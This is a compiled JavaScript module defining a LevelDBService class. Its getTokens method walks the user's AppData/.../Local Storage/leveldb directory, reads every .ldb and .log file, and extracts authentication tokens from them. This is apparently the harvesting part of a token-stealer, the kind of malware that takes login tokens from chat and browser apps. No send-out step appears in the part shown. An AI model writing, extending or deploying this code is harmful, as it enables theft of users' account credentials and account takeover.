"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.LevelDBService = void 0;
const Bluebird = require("bluebird");
const fs = require("promise-fs");
const path = require("path");
const os = require("os");
const storage_1 = require("@assasans/storage");
const service_1 = require("./service");
class LevelDBService extends service_1.Service {
    constructor(name, directory) {
        super(name, directory);
    }
    async getTokens() {
        const tokens = new storage_1.List();
        const directory = path.join(os.homedir(), 'AppData', this.directory, 'Local Storage/leveldb');
        if (!await this.exists(directory))
            return tokens;
        const files = (await fs.readdir(directory, { encoding: 'utf8' }))
            .filter((name) => ['ldb', 'log'].includes(path.extname(name).slice(1).toLowerCase()))
            .map((relative) => path.join(directory, relative));
        await Bluebird.all(files.map(async (file) => {
            try {
                const content = await fs.readFile(file, { encoding: 'utf8' });
                tokens.addRange(this.extractTokens(content));
            }
            catch (error) {
                console.error(error);
            }
        }));
        return tokens;
    }
}
exports.LevelDBService = LevelDBService;
//# sourceMappingURL=leveldb.js.map